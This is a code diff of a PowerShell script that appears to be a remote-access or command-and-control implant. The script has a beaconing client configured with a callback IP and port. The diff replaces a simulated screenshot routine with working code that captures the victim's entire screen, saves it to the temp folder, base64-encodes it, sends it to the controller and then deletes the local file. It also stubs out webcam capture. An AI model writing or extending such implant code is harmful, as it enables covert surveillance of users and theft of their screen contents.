@@ -12,7 +12,7 @@ $global:sentFirstBeacon = $false
 $global:sessionId = $null
 $global:logEnabled = $true
 $global:chunkSize = 1024
-$global:address = '10.0.0.129'
+$global:address = '10.0.0.127'
 $global:port = 54678
 $global:maxRetries = 5
 $global:retryMode = $false;
@@ -261,39 +261,44 @@ function New-FileName {
 }
 
 function Invoke-WebcamClip {
-    try {
-        # Placeholder for webcam capture
-        $fileName = New-FileName -name 'wc' -extension 'jpg'
-        # Simulate webcam capture
-        [byte[]]$fakeImageData = [System.Text.Encoding]::UTF8.GetBytes("Fake webcam image data")
-        Send-Command @{
-            response = @{
-                download = $fileName
-                data = [Convert]::ToBase64String($fakeImageData)
-            }
-        }
-    }
-    catch {
-        Send-Command @{
-            response = @{
-                error = "Failed to capture webcam: $($_.Exception.Message)"
-            }
+    Send-Command @{
+        response = @{
+            error = "Currently not supported in this client type."
         }
     }
 }
 
 function Invoke-Screenshot {
     try {
-        # Placeholder for screenshot capture
+        
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        
+        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $Width  = $Screen.Width
+        $Height = $Screen.Height
+        $Left   = $Screen.Left
+        $Top    = $Screen.Top
+        
+        $bitmap  = New-Object System.Drawing.Bitmap $Width, $Height
+        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)    
+
         $fileName = New-FileName -name 'ss' -extension 'jpg'
-        # Simulate screenshot capture
-        [byte[]]$fakeScreenshotData = [System.Text.Encoding]::UTF8.GetBytes("Fake screenshot data")
+        $bitmap.Save("$env:TEMP\\$fileName", [System.Drawing.Imaging.ImageFormat]::Jpeg)
+        $bitmap.Dispose()
+        $graphic.Dispose()
+
+        [byte[]]$image = Get-Content -Path "$env:TEMP\\$fileName" -Encoding "Byte" -Raw
+
         Send-Command @{
             response = @{
                 download = $fileName
-                data = [Convert]::ToBase64String($fakeScreenshotData)
+                data = [Convert]::ToBase64String($image)
             }
         }
+
+        Remove-Item -Path "$env:TEMP\\$fileName" -Force | Out-Null
     }
     catch {
         Send-Command @{
